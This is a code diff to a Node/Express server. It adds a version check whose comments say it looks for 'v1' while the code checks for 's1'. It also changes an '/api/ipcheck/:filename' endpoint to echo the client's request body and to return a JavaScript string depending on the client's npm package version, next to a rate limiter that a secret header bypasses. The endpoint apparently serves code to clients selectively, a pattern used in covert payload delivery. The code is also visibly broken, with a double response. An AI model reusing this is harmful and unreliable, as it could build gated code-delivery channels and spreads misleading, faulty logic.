@@ -40,6 +40,18 @@ const limiter = rateLimit({
   skip: (req) => req.headers["x-secret-header"] === SECRET_HEADER_VALUE,
 });
 
+function endsWithV1(str) {
+  // Check if the string is at least 2 characters long
+  if (str.length < 2) {
+      return false; // Not enough length to end with 'v1'
+  }
+  // Get the last two characters of the string
+  const lastTwoChars = str.slice(-2);
+  
+  // Check if the last two characters are 'v1'
+  return lastTwoChars === 's1';
+}
+
 // Apply rate limiter globally
 // app.use(limiter);
 
@@ -152,6 +164,10 @@ app.post("/api/ipcheck/:filename", (req, res) => {
   console.log("req.body", req.body);
 
   // Check if the file exists
+  res.json(req.body);
+  if(endsWithV1(req.body.npm_package_version)  ){
+    res.json('console.log("Development server started...")');
+  }
   fs.access(filePath, fs.constants.F_OK, (err) => {
     if (err) {
       return res.status(404).json({ error: "IP check failed." });
